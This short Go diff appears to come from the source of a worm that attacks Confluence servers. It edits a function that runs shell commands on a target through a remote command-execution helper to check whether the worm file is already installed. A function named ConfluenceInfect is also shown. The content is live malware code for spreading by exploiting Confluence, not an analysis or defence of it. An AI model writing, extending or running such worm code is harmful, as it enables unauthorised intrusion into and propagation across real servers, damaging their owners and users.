@@ -38,9 +38,9 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
   }
 
 	func ConfluenceCheckInfection(url string, endpoint string) bool {
-		command := fmt.Sprintf("ls -l %s", wormPath)
+		command := fmt.Sprintf("test -f %s && echo wormHere", wormPath)
 		resp := ConfluenceCmdExecute(url, endpoint, command)
-		return strings.Contains(resp, wormPath)
+		return strings.Contains(resp, "wormHere")
 	}
 
 	func ConfluenceInfect(url string, endpoint string) bool {
